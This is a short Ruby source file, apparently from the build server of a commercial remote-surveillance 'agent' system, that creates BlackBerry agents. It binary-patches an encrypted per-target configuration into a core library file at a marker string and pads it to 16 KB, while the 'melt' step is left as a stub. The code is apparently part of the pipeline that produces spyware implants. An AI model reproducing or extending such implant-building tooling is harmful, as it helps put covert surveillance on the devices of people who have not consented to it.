#
#  Agent creation for blackberry
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildBlackberry < Build

  def initialize
    super
    @platform = 'blackberry'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'net_rim_bb_lib_base'

    # invoke the generic patch method with the new params
    super

    trace :debug, "Build: adding config to [#{params[:core]}] file"

    # blackberry has the config inside the lib file, binary patch it instead of creating a new file
    file = File.open(path(params[:core]), 'rb+')
    file.pos = file.read.index 'XW15TZlwZwpaWGPZ1wtL0f591tJe2b9'
    config = @factory.configs.first.encrypted_config(@factory.confkey)
    # write the size of the config
    file.write [config.bytesize].pack('I')
    # pad the config to 16Kb (minus the size of the int)
    config = config.ljust(2**14 - 4, "\x00")
    file.write config
    file.close
    
  end

  def melt(params)
    trace :debug, "#{self.class} #{__method__}"

    #puts File.read(path('jad'))

  end

end

end #DB::
end #RCS::
